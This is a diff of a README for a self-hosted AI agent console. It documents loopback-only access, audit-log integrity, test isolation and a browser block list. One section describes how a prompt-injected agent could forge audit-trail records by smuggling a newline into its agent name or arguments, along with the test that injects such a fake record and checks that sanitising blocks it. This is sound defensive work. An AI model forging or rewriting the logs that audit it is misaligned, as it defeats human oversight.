-  on each device — after which the copy is reachable from anywhere again, which is what a token is for. 🔑
-- 🔁 **Three spellings of "this machine"** count as local: `127.0.0.1`, `::1`, and the IPv4-mapped
-  `::ffff:127.0.0.1` that some Windows stacks report. All three are asserted in the suite, along with a LAN
-  address, another private address and a public one — none of which are local. 🧪
-- 🕳️ **No peer address at all passes** (the CLI, and PHP's built-in server before it has bound). There is no
-  network path there to refuse — and refusing it would only break the tooling that runs on the same machine. 🖥️
-- 🎭 **The `Host` header is deliberately not consulted.** It is client-supplied, so a rule like "the Host
-  matched the peer address" would let anyone in by naming **their own** address in the request. The decision
-  is made on the **socket**, not on anything the caller wrote. 🚫
-- 🤝 **The MCP RPC route is exempt, on purpose.** `POST /api/mcp-server` exists for other machines and keeps
-  its own **per-friend Bearer token** with a **read / write / exec** scope ceiling, an optional IP allowlist
-  and one-click revoke (§12). It is the one door this rule must leave open — and it is a *door*, not a hole:
-  the caller is authenticated before anything runs. 🔐
-- ⚖️ **The honest edge:** a request arriving through a **reverse proxy on the same host** has the proxy as
-  its peer, so it looks local and passes. That is the operator's own configuration rather than a stranger's
-  path (§4, *the jail*), and the answer is the same as everywhere else in this app: **set a token** and the
-  question stops mattering. 🧱
-
-### 🧾 22. The trace is written by this app alone
-
-`storage/exec.log` is the audit trail — the two-phase `run=… phase=start|end` record that **Config → TRACE →
-EXEC** reads back, that pairs a command's start with its end, and that shows an opened window as *started and
-still running*. 🧾 Its authority depends on one property: **one line per record.** 📏
-
-- 🪤 **So a newline is a forgery.** Free text reaches these fields — the **agent name** arrives in the tool
-  call, and every **argv element** is whatever a model sent. A `\n` in either one would let a prompt-injected
-  agent **append a hand-written line** describing a command that never ran (or, worse, make a real one look
-  like part of a different record) — the audit trail quietly rewritten by the thing it is auditing. 🎭
-- 🛡️ **Stripped at the one chokepoint, not at the callers.** Sanitising lives **inside `Sandbox::audit()`**,
-  which `exec`, `run_code`, `window_open` and `window_close` all pass through — so a future caller cannot
-  forget it, and it runs **before** the shell-quoting decision below, so a quote-escaped argument cannot carry
-  a line break through the escaping. 🚧
-- 🧬 **Two shapes, because the line carries two kinds of field.** The fields the reader takes as a **single
-  token** (`run`, `phase`, `kind`, `agent`) lose everything from the first break onward and any character
-  outside `[\w.:@-]` — a space there would split the field and make the whole line unparseable, which would
-  lose a **real** record while stopping a forged one. Free text (`cwd`, the program, the argv) turns breaks
-  into a space and is capped (240 characters per field, 12 argv elements), so one enormous argument cannot
-  bloat the log either. ✂️ An empty token becomes `-`, because an empty field breaks the reader's pattern. 🩹
-- 👀 **The reader still shows the interesting failure.** Start and end lines are paired by their `run` id, and
-  a start with no end comes back as `finished: false` — *started, never finished* is exactly the row you want
-  to see after a crash or a kill mid-command, so it is surfaced rather than hidden. 🔍
-- 🧪 **Proven** — `tests/php/programs.test.php` §5d writes an audit entry whose agent name contains a newline
-  and a complete fake record (`run=forged-inject phase=start …`), then asserts the real run is still recorded
-  in one piece **and that the forged run id never becomes an entry of its own**. ✅
-
-### 🧾 23. The test suite cannot touch the trace — or another file's server
-
-`tests/` is dev tooling the app never loads, and it now runs **four files at a time**. That is only safe because
-the two things those files used to share were taken away first — and both of them were **state this app's own
-security rests on**. 🧪
-
-- 🧾 **The audit trail is not a scratch file.** `storage/exec.log` is the two-phase record covered in **§22**: the
-  answer to *"did anything actually run?"*. Two test files wrote it, and each remembered its size on entry and
-  **truncated it back on the way out** — tidy when you are the only writer, and a **deletion of another file's
-  lines** the moment you are not, which is exactly what running them at the same time makes them. A test run could
-  be mistaken for real commands, and a real command's record could vanish under one. The trace a test writes now
-  goes to a directory of that file's own: `Sandbox::logDir()` honours `ROUTER_LOG_DIR`, the runner sets it per
-  file, and `storage/mcp.log` (**§12**) goes the same way. Running the whole suite leaves the operator's
-  `exec.log` and `mcp.log` **byte-identical** — measured, not hoped. 🛡️
-- 🔒 **The redirect cannot be reached from outside.** `ROUTER_LOG_DIR` is read from the **process environment**.
-  There is no route, header, query string or config field that sets it, so no request and no model can move, hide
-  or read a log by asking for it, and unset — the normal state — keeps `storage/` exactly as it was. Its only
-  reachable effect is to add a directory that a test writes to. 🚫
-- 🌐 **Loopback only, and a port of its own.** Every server the suite starts binds **`127.0.0.1`** and never
-  `0.0.0.0` — the generated Apache config is literally `Listen 127.0.0.1:<port>` — and the port is now a walk
-  from `21000 + pid % 4000`, which stays **below the OS's ephemeral range**. The old way asked the OS for "any
-  free port" (`tcp://127.0.0.1:0`), which is a race the moment two files ask at the same moment: the number
-  returns to the pool as the socket closes, so both can be handed the same one and one file ends up **talking to
-  the other file's server** — assertions answered by a server it never started. A port a real service is *using*
-  is no longer a candidate either, which matters because a bind failure there looks exactly like a broken build. 🧭
-- 🙋 **Separate processes, for the same reason as ever.** The suite separates its files so one cannot colour
-  another's result (**§17**). A file that can reach into another file's socket or log can report green for
-  something it never checked, so "each file is its own process" has to stay true down to the port it binds and
-  the file it writes. ✅
-- 🧪 **Proven** — six consecutive four-wide runs plus `--jobs 8` and `--jobs 2`, all green with identical counts;
-  sampling `netstat` during a run caught **seven simultaneous listeners, all inside the pid-derived band and none
-  of them repeated**; run by itself with `ROUTER_LOG_DIR` set, `sandbox.test.php` writes its 9 audit lines into
-  that directory while the install's `exec.log` is unchanged; and a full fresh-copy check — `14 files, 14 passed,
-  0 failed, 840 assertions, 5 skipped` — costs 16.8–17.5s where it cost 41.0s. 🔬
-
-> 🧷 **One rule underneath all of this:** nothing that a model can *write* ever becomes a decision the app
-> obeys. A name, not a path; argv, not a command line; a mask, not a credential; the peer address, not the
-> `Host` header; one token, not two records. That is the whole design, repeated in five different places. 💙
-
 ---
 
 ## 🔌 MCP — connect **out** to other servers (client)
@@ -1293,26 +1319,6 @@ The operator hands over the **URL + that friend's token** — that pair is all t
 </details>
 
 ---
-## 🌐 Built-in browser — you watch, the agents drive
-
-![The built-in browser: live page, address bar, click-through and the drive-it rail](screenshots/Browser.png)
-
-A **real Chrome or Edge**, right inside the console — 🚫 no packages, 🚫 no extensions, just the DevTools Protocol. 🖥️ Open it from the **Browser** item in the apps notch and you get the live page, an address bar, **Go / Reload**, a **Live** auto-refresh, a headless ⇄ window toggle, and a **click-through** view: tap the page and it clicks. ✨
-
-<details>
-<summary>Click, type and read, logins, gates and the block list</summary>
-
-- 🖱️ **Click, type, read** — click anywhere on the screenshot, type into the field you need, press **Enter**, and pull the page's visible text.
-- 🤖 **Agents use the same page** — `browser_open` / `browser_click` / `browser_type` / `browser_read` / `browser_wait` drive it too, so a model can genuinely operate a web app.
-- 🔐 **Logins stick** — the profile is persistent: log in **once** (headless, or in a window you can take over 🫳) and both you and the agents reuse the session.
-- 🛡️ **Off by default and gated** — Config → Labs → *Browser* switches it on; **http/https only**, cloud-metadata addresses refused, and every route is token-gated.
-- 🚫 **A domain / URL / IP block list** — a right-rail box on the Browser screen. One pattern per line, `*` wildcard: `*.gov`, `*word*`, a bare host/IP (`10.0.0.1`), or a URL path (`site.com/a/b/`). Enforced **server-side on every navigation** — yours *and* the agents' — and **re-checked after a click or type** in case a link reaches a banned host.
-- 🐕 **One browser, reaped** — launching (or stopping) reaps any stray headless Chrome/Edge still holding the profile dir, so orphan instances never pile up and chew CPU/GPU.
-- ⚡ **No multi-second stalls** — DevTools HTTP is read by exact `Content-Length` over a raw socket, navigation returns the moment the page is interactive, and every action is single-flight so a slow page can't stampede the connection pool.
-
-</details>
-
----
 ## 📱 Android & mobile
 
 The UI is **mobile-first** — touch controls, a responsive layout, an icon rail on phones, and it works in the phone's browser right next to wireless-debugging tooling.
@@ -1363,25 +1369,26 @@ The UI is **mobile-first** — touch controls, a responsive layout, an icon rail
 │   └── cacert.pem
 ├── tests/
 │   ├── run.mjs           # the whole suite: PHP, then JS
-│   ├── php/              # sandbox · harness · mcp · mcpServer · mcpStdio ·
-│                         #   guards · apacheGuards · nginxGuards  (run.php)
-│   └── js/               # agentSearch · context · curl · drawerState ·
-│                         #   harness · ifaceMode · latency · nativeTools ·
-│                         #   stripToolCall                       (run.mjs)
+│   ├── php/              # 20 files: sandbox · programs · secrets · setupToken ·
+│                         #   tls · update · mcp · mcpServer · mcpStdio · guards ·
+│                         #   apacheGuards · nginxGuards · layers · docs  (run.php)
+│   └── js/               # 24 files: context · curl · harness · ifaceMode ·
+│                         #   latency · nativeTools · toolCalls · sandboxBinding ·
+│                         #   rebindButton · localEndpoints   (run.mjs)
 ├── screenshots/
 ├── storage/              # JSON data (config, state, sessions) — git-ignored
 ├── serve.php             # php -S router (no Apache needed)
-├── start.bat / start.sh  # launchers
+├── start.bat / start-php.bat / start.sh  # launchers
+├── install-update.php     # update without the UI (--finish / --rollback)
 ├── setup-xampp.bat/.ps1  # one-click Apache + PHP (Windows)
 ├── setup-token.sh        # create / rotate the access token (+ storage guard)
 ├── nginx.example.conf    # deny storage/ + tests/ on nginx (copy into server{})
+├── VERSION
 ├── CHANGELOG.md
 └── README.md
 ```
 
----
 
----
 
 ## 🧪 Tests
 
@@ -1401,8 +1408,8 @@ Either half runs on its own, which is what you want while working on one of them
 | --- | --- |
 | 🧪 `node tests/run.mjs` | Both suites, PHP then JS |
 | 🐘 `php tests/php/run.php` | PHP only — sandbox, **desktop programs** (`programs.test.php`: the operator's list as the whole allowlist, the detached launch, binary-path matching, real kill verdicts and the un-forgeable trace), **masked secrets** (`secrets.test.php`: masks going out, restores coming back, and who may ask when there is no token), the **token recovery script** (`setupToken.test.php`), harness, MCP client/server, HTTP guards (`serve.php`, Apache `.htaccess`, and the nginx rules via PCRE), and the CSS/JS **layer audit** |
-| 🟨 `node tests/js/run.mjs` | JS only — context, curl, drawer state, harness, interface mode, latency, native tools, tool-markup stripping |
-| 🌱 `php tests/freshClone.php` | **Both suites, in a fresh copy** of the tree in the temp dir — the same check a clone gets, run every time (needs `git`, which supplies the file list). `--head` clones the last commit instead of the working tree; `--keep` keeps the copy. Deleted on success, kept when something fails. Ends every run — pass or fail — with its measured total, split by phase: `took: 16.8s  (copy 0.4s, PHP 15.5s, JS 1.0s)` |
+| 🟨 `node tests/js/run.mjs` | JS only — 24 files: context, curl, harness, interface mode, latency, native tools, tool calls and markup stripping, sandbox binding, the rebind button, backup sections, comms, rate governor, `localEndpoints` |
+| 🌱 `php tests/freshClone.php` | **Both suites, in a fresh copy** of the tree in the temp dir — the same check a clone gets, run every time (needs `git`, which supplies the file list). `--head` clones the last commit instead of the working tree; `--keep` keeps the copy. Deleted on success, kept when something fails. Ends every run — pass or fail — with its measured total, split by phase: `took: 37.6s  (copy 6.9s, PHP 28.3s, JS 2.4s)` |
 
 - **The layer audit is a stylesheet test.** `tests/php/layers.test.php` parses `ui/css/*.css` (and the handful of `z-index` values set from `ui/js` and `index.html`) and fails if any **surface** — panel, drawer, pane, menu — ties or outranks a dialog. Notices are exempt by name with a reason: the fatal banners, the boot splash, the CRT scanline overlay, toasts and the approval prompt, which must be visible over a dialog. It reads the dialog's number and the ladder comment in `modals.css` rather than hardcoding them, so moving the layer means updating both. It exists because dialogs once sat *below* the built-in Browser pane and an agent's ⋮ menu at 3000, and nothing failed.
 - **Each test file is its own process**, exactly as if you had run it by hand, so one file's globals or a failed import cannot colour another's result — and **several run at the same time** (4 by default; `php tests/php/run.php --jobs 1` for one after another, `--jobs N` for a different width). Results are still printed in **file-name order**, whatever order they finish in, so two runs of the same tree read the same way and a failure's full output still sits under its own `FAIL` line. That is only safe because the two things the files used to share are gone: **the port each server binds** — a walk that starts from a number derived from the file's own process id ([tests/php/free-port.php](tests/php/free-port.php), required by the three files that start a server), rather than `tcp://127.0.0.1:0`, which hands the same port to two files that ask in the same moment and leaves one of them binding an occupied port or talking to the other one's server — and **the log each file writes** — `exec.log` and `mcp.log` are appends in the install's `storage/`, and a test that truncates the trace back to the size it found it at would delete a line another file was about to read, so each file is given a log directory of its own (`ROUTER_LOG_DIR`). One side effect worth having: the suites no longer write the operator's `storage/exec.log` or `storage/mcp.log` at all.
@@ -1410,8 +1417,8 @@ Either half runs on its own, which is what you want while working on one of them
 - **A file that cannot run one of its checks prints `SKIP:` with the reason — and the runner repeats it.** A skip should mean *this machine cannot do it* — no `bash` to drive `setup-token.sh`, no `python` for the audit checks, no `curl` extension, no symlinks on Windows — and never *this checkout is missing something only the operator has*. A test that needs a fixture **builds** it: `apacheGuards.test.php` writes a throwaway copy of the app into the web root, asserts against it and removes it, and `guards.test.php` uses `storage/models.json`, which ships with the app, rather than a session transcript only the operator has. The runner re-prints those `SKIP:` lines under the file's result and totals them, because otherwise *"this file skipped two of its checks"* looks exactly like *"this file had two checks"* — which is how a fresh clone quietly ran 18 fewer assertions than the machine they were written on, and still reported green.
 - **A suite that cannot run fails the command** instead of being quietly skipped: with no `php` on PATH you get `PHP suite did not run` and exit `1`. Point `PHP_BINARY` at the binary if it lives somewhere unusual.
 - **No internet and no browser.** The JS tests import the real modules (`tools.js`, `utils.js`, `nativeTools.js`) straight into Node; the PHP ones use a temporary sandbox root and a local stdio MCP mock. The only servers are the ones the three files that need one start for themselves, each on a loopback port whose walk starts from its own process id (see the port note above) — `php -S` for `serve.php`'s own router, and the local Apache for the shipped `.htaccess` files — and each shuts its server down when it finishes. `nginxGuards.test.php` starts nothing at all: it lifts the `location` regexes out of `nginx.example.conf` and runs them through PCRE, which is the engine nginx matches with. One Apache detail it has to handle: Apache reads `.htaccess` from directories **above** `DocumentRoot` too, so a copy of the app nested inside another copy would have the parent's file parsed as server config (`<IfModule not allowed here`) and answer `500` to everything — which is why the generated config pins every ancestor to `AllowOverride None` and leaves only the shipped files in play.
-- **A pre-commit hook runs the fresh-copy check on what you are committing.** `.githooks/pre-commit` calls `tests/freshClone.php --index`, so the copy is the **staged** snapshot and not the working tree — a half-staged commit is checked as the commit it will actually be. Turn it on once per clone with `git config core.hooksPath .githooks` (nothing in a repo can install a hook into someone's `.git`), skip one commit with `git commit --no-verify`, and know that it costs about **17 seconds** — 16.8–17.5s measured over six runs here, down from 41s, where an earlier note claimed "about two minutes" — which is what the check costs. A cold machine is slower: the copy is 281 files, and a scanner reading them fresh is part of the price. Neither tool asks you to trust a number, either — every run ends with what it actually cost, on the way past whether it passed or failed: `took: 16.8s  (copy 0.4s, PHP 15.5s, JS 1.0s)`, with the hook's own end-to-end seconds printed beside it. The breakdown says where the money goes, and it is still not where it first looked: the two long files are `programs.test.php` (every look at the process table is a PowerShell start, ~0.65s, and the feature is *about* what that table says) at ~13s and `setupToken.test.php` (16 real invocations of the recovery script at ~0.8s each, in an environment where python is deliberately broken so php is the engine that gets used) at ~12.7s. Serially that made the PHP half their **sum** (39.4s); running the files at the same time makes it **the slowest file plus a little** (~15.6s), because the longest files are started first and twelve short ones fit around them. Booting Apache, `serve.php` and the MCP mock cost about two seconds between them, and the JS half is about a second. When a suite fails the copy is kept, so the failure can be looked at where it happened.
-- **End a test file with its own count**, e.g. `58 passed, 0 failed` — plus `, N skipped` when it had to skip something. The runners read that last line for the per-file summary and the total, and never trust the count of a file that failed. A fresh clone should report the **same** numbers as the machine the tests were written on: `14 files, 14 passed, 0 failed, 840 assertions, 5 skipped` on both.
+- **A pre-commit hook runs the fresh-copy check on what you are committing.** `.githooks/pre-commit` calls `tests/freshClone.php --index`, so the copy is the **staged** snapshot and not the working tree — a half-staged commit is checked as the commit it will actually be. Turn it on once per clone with `git config core.hooksPath .githooks` (nothing in a repo can install a hook into someone's `.git`), skip one commit with `git commit --no-verify`, and know that it costs about **38 seconds** here — `took: 37.6s` measured — which is what the check costs. A cold machine is slower: the copy is 306 files, and a scanner reading them fresh is part of the price. Neither tool asks you to trust a number, either — every run ends with what it actually cost, on the way past whether it passed or failed: `took: 37.6s  (copy 6.9s, PHP 28.3s, JS 2.4s)`, with the hook's own end-to-end seconds printed beside it. The breakdown says where the money goes, and it is still not where it first looked: the two long files are `programs.test.php` (every look at the process table is a PowerShell start, ~0.65s, and the feature is *about* what that table says) and `setupToken.test.php` (16 real invocations of the recovery script at ~0.8s each, in an environment where python is deliberately broken so php is the engine that gets used) . Serially that made the PHP half the **sum** of the two; running the files at the same time makes it **the slowest file plus a little**, because the longest files are started first and twelve short ones fit around them. Booting Apache, `serve.php` and the MCP mock cost about two seconds between them, and the JS half is about a second. When a suite fails the copy is kept, so the failure can be looked at where it happened.
+- **End a test file with its own count**, e.g. `58 passed, 0 failed` — plus `, N skipped` when it had to skip something. The runners read that last line for the per-file summary and the total, and never trust the count of a file that failed. A fresh clone should report the **same** numbers as the machine the tests were written on: `PHP 20 files, 20 passed, 1,129 assertions, 5 skipped` and `JS 24 files, 24 passed, 681 assertions` on both.
 
 > ⚠️ Some tests **skip** instead of pass, and each prints a `SKIP:` line when it does: `sandbox.test.php` skips its git checks when git is missing or its commands are refused in the temporary directory; `guards.test.php` skips if `proc_open` is disabled, no loopback port can be bound, or a checkout has no `storage/sessions/*.json` yet; and `apacheGuards.test.php` skips when there is no Apache to boot — point `ROUTER_HTTPD` at one to run it (its nested-copy checks also skip when no second copy of the app is present). A green run therefore does not cover those cases — read the line, it is not a pass.
 
@@ -1445,10 +1452,11 @@ Failures come back as `{"error": "..."}` with HTTP 400 and a message meant for t
 </details>
 
 ---
+
 ## 🧯 Troubleshooting
 
 - **"PHP's curl extension is not enabled"** → the server was started without the launcher (e.g. a bare `php -S`). Use `start.bat` / `start.sh`, or run `php serve.php --setup`.
-- **Every request returns 401** → the **Access token** isn't pasted on this device. The token is per-device; paste it in **Config → Access token**.
+- **Every request returns 401** → the **Access token** isn't pasted on this device. The token is per-device; paste it in **Config → Access token**. A **403 `local requests only`** is a different thing: this copy has no token set and is answering this machine only (§21) — run `./setup-token.sh` (Windows: `start.bat -Token`), then paste that token on the phone as well as the PC.
 - **Phone shows an empty UI or immortal 401s** → a **split-brain** load. Deploy the **whole `ui/` folder** (never single files) and hard-refresh — mixing module versions gives each its own store.
 - **Agents "won't use tools"** → check for a **global pre-prompt** that says "reply with ONLY text / N words" — it fights the tool protocol. The tool instructions now override it and the loop re-prompts once, but turning it off is cleanest. A fleet-wide house rule is fine — just remember it **prepends** to each agent's prompt by default (or **replaces** it if you flip the toggle in the editor).
 - **An agent's badge says HELD and nothing happens** → it's parked. A **cap** (Config → Limits & Budgets → *Max iterations* / *Max minutes*) held it, or you stopped it by hand. Click **Config → Permissions → RELEASE HELD AGENTS** (or toggle the master switch off and on). To loop forever, set both caps to **`0`** and give the agent a real standing goal — a goal of `idle` gives it nothing to aim at, so it will wander.
@@ -1465,3 +1473,8 @@ Failures come back as `{"error": "..."}` with HTTP 400 and a message meant for t
 **Copyright** — M. Bryce Hudson 2026-2029 All Rights Reserved See [`LICENSE`](LICENSE). 💙
 
 Made by [MBHudson](https://github.com/mbhudson/)
+
+
+
+
+
